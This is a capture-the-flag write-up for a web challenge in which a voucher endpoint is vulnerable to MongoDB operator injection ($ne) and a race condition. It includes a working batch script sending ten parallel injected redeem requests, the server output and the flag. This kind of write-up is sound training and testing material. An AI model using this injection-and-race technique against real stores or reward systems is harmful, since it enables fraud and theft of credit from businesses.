# Fast track- Web Exploitation

## Flag 

`citadel{ak1ra_w4it5_f0r_y0u_4t_n1te}`
### Vulnerability

The voucher redemption system contains a NoSQL injection vulnerability and race condition. The endpoint fails to sanitize input, allowing MongoDB operator injection via discountCode[$ne]= to bypass validation. A non-atomic check-then-update pattern with a 2-second delay creates a race window where concurrent requests can all read the unredeemed state before any writes occur, multiplying the reward.

### Exploit

Registers user, exploits race condition with 10 parallel NoSQL-injected requests to accumulate 50 points, purchases flag is the intended soln but 



i got the flag by sending 10 requests by exploiting abv mentioned vuln.

NoSQL Injection `$ne` operator to Bypass  validation
 race con : 10 parallel requests during 2s delay which Multiply rewards from 5 to 50 points
Purchase product ID 4 at last to Get the flag

```
@echo off
REM Register user
curl.exe -s -c c:\tmp\c.txt -H "Content-Type: application/json" -d "{\"username\":\"u%RANDOM%\",\"password\":\"pass123\"}" http://chall_citadel.cryptonitemit.in:62014/register-user
echo.
echo Registration complete 
echo.

REM Run 10 parallel redeem requests
echo Running redeem requests...
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem

REM Wait for background processes
timeout /t 5 /nobreak >nul

echo.
echo  Redeem requests complete 
echo.

REM Purchase the flag
echo Purchasing flag...
curl.exe -s -b c:\tmp\c.txt -H "Content-Type: application/json" -d "{\"productId\":4}" http://chall_citadel.cryptonitemit.in:62014/store
echo.

```


the terminal output : 
```
PS C:\Citadel_CTF_Writeups\Fast_Track> .\run_exploit.bat
{"success":true,"message":"Welcome to the Tower, Regular!"}
 Registration complete 

Running redeem requests...
{"success":true,"message":"Voucher redeemed! New Balance: 15 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":15,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 10 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":10,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 10 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":10,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 20 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":20,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 30 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":30,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 25 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":25,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 50 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":50,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 35 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":35,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 50 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":50,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}{"success":true,"message":"Voucher redeemed! New Balance: 40 Shinsu Points","code":"HoHoHo25","value":5,"newBalance":40,"injection_success":{"technique":"NoSQL injection","operators_used":["$ne"],"query_executed":"DiscountCodes.findOne({ discountCode: {\"$ne\":\"\"} })"}}
 Redeem requests complete 

Purchasing flag...
{"success":true,"message":"Item acquired successfully! Remaining balance: 0 Shinsu Points","product":{"Name":"Guardian's Secret Scroll","Description":"Ancient knowledge from the Tower's Guardian containing forbidden secrets about the upper floors.","FLAG":"citadel{ak1ra_w4it5_f0r_y0u_4t_n1te}"}}
```
